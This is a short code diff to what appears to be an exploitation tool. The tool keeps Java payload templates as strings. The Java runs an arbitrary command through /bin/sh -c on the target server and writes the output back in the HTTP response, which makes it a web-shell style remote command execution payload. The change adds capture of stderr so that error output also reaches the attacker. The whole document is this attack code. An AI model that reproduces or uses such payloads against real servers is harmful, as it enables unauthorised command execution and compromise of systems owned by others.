@@ -17,12 +17,14 @@ code = """
                 new String[] {"/bin/sh", "-c", payload}
             );
         }
-        java.util.Scanner s = new java.util.Scanner(process.getInputStream())
+        java.util.Scanner i = new java.util.Scanner(process.getInputStream())
             .useDelimiter("\\\\A");
-        String result = s.hasNext()?s.next():"";
+        java.util.Scanner e = new java.util.Scanner(process.getErrorStream())
+            .useDelimiter("\\\\A");
+        String result = i.hasNext()?i.next():e.hasNext()?e.next():"";
         try {
             invokeMethod(invokeMethod(response, "getWriter"), "write", result);
-        } catch (Exception e) {}
+        } catch (Exception ex) {}
         return result;
     }
 """
@@ -41,8 +43,10 @@ proc = """
                     new String[] {"/bin/sh", "-c", payload}
                 );
             }
-            java.util.Scanner s = new java.util.Scanner(process.getInputStream())
+            java.util.Scanner i = new java.util.Scanner(process.getInputStream())
                 .useDelimiter("\\\\A");
-            String result = s.hasNext()?s.next():"";
+            java.util.Scanner e = new java.util.Scanner(process.getErrorStream())
+                .useDelimiter("\\\\A");
+            String result = i.hasNext()?i.next():e.hasNext()?e.next():"";
             res.getWriter().write(result);
 """
